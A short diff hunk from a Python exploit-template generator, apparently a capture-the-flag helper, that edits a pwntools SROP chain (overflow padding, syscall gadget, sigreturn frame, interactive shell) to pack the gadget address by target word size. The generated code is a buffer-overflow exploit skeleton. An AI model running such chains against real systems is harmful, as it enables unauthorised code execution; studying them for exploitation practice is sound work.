@@ -589,7 +589,7 @@ def _srop_chain(path: str, bits: int, arch: str, pop_rdi: int | None = None, ove
         f"    # the kernel requires rax == SYS_rt_sigreturn (15) at the moment `syscall` runs; either land here\n"
         f"    # where eax is already 15 from a prior syscall wrapper, or chain a `pop rax; ret` gadget first\n"
         f'    payload  = b"A" * OFFSET\n'
-        f"    payload += p64(SYSCALL)\n"
+        f"    payload += pack(SYSCALL)  # context.bits-aware: p32 on 32-bit targets, p64 on 64-bit\n"
         f"    payload += bytes(frame)\n"
         f'    io.sendlineafter(b"> ", payload)\n'
         f"    io.interactive()\n\n"
